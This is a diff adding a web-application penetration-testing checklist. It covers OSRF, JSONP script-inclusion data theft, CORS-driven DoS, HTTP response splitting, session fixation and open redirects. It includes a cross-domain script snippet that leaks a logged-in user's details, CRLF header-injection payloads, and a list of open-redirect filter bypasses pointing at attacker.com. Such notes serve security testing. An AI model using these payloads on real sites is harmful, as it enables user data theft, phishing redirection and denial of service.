@@ -1,0 +1,57 @@
+* In every location where data submitted by one user is displayed to other users but you cannot perform a stored XSS attack, review whether the application's behavior leaves it vulnerable to OSRF. The vulnerability typically arises where user-supplied data is inserted into the target of a hyperlink or other URL within the returned page.
+
+* Anti-frame defenses (anti clickjacking) may not be implemented in the mobile version of the application.
+
+* If the response to this URL https://vulnerable-server/auth/YourDetailsJson.ashx contains a callback to a function showUserInfo() that dispalys user details (javascript function), to exploit it, create a page in the domain we own like this:
+	<script>
+		function showUserInfo(x) { alert(x);}
+	</script>
+	<script src="https://vulnerable-server/auth/YourDetailsJson.ashx">
+	</script>
+
+Then send the link to the logged in user and the details will be found in the log. So the idea is to check every javascript function returned by every page, and those within javascript files. 
+
+The same thing applies on a variable. I mean if http://vuln/status returns a variable X having the value Y, an attacker can create a page on his domain containing:
+	<script src="http://vuln/status">
+	</script>
+	<script>alert(X);</script>
+
+* When cross-domain is allowed (origin: *), XMLHttpRequest may be used to cause a DoS. It will send multiple requests faster than the normal DoS, but we have to add a parameter in the URL and increase its value within each request to tell the server that the browser is requesting another URL.
+
+* Header injection (HTTP Response Splitting) occurs when a value of a parameter is returned in the response headers. To test it, check if the application allows %0d and %0a and use this payloads: http://vul/page?param=foo%0d%0abar:+now and the response will contain the header bar: now
+Other payloads: 	http://vul/page?param=foo%00%0d%0abar:+now
+			http://vul/page?param=foo%250d%250abar:+now
+			http://vul/page?param=foo%%0d0d%%0a0abar:+now	
+
+* Try to authenticate using an account. Then use the generated cookies to access the login page in another browser. Use different credentials. If the old user is changed to the new one, the application is vulnerable.
+Also, try to inject session cookies with a valid form when first accessing the app. Try to login and check if the app is vulnerable to session fixation.
+
+* Check where there is a redirection, it may be vulnerable when the application uses user input to redirect a user to a specific page. One case where the app may be vulnerable is when the application logs out a user after session timeout then after successful redirection, it redirects him to the page just before logout.
+
+* If the user controllable data is put into an iframe, injecting another URL may cause loading the content of this URL into the iframe of the app.
+!!P.S: try this technique when HTML injection is possible but XSS is not.
+
+* If the application is blocking absolute URLs, try these:
+	- HtTp://attacker.com
+	- %00http://attacker.com
+	-  http://attacker.com   // note the space before http
+	- %68%74%74%70%3a%2f%2fattacker.com
+	- %2568%2574%2574%2570%253a%252f%252fattacker.com
+	- http:\\attacker.com
+	- http:///attacker.com
+	- http://http://attacker.com	
+	- http://attacker.com/http://attacker.com
+	- hthttp://tp://attacker.com
+	- http://vuln-server.com.attacker.com
+	- http://attacker.com?http://vuln-server.com
+	- http://attacker.com/%23http://vuln-server.com
+
+* If the application request/response is something like this :
+	GET /updates/72/?redir=/updates/update29.html HTTP/1.1
+	Host: vuln-server.net
+
+	HTTP/1.1 302 Object moved
+	Location: http://vuln-server.net/updates/update29.html
+
+It is vulnerable if the app does not include / after http://vuln-server.net, because an attacker can inject redir=.attacker.com
+so that the response will be Location: http://vuln-server.net.attacker.com
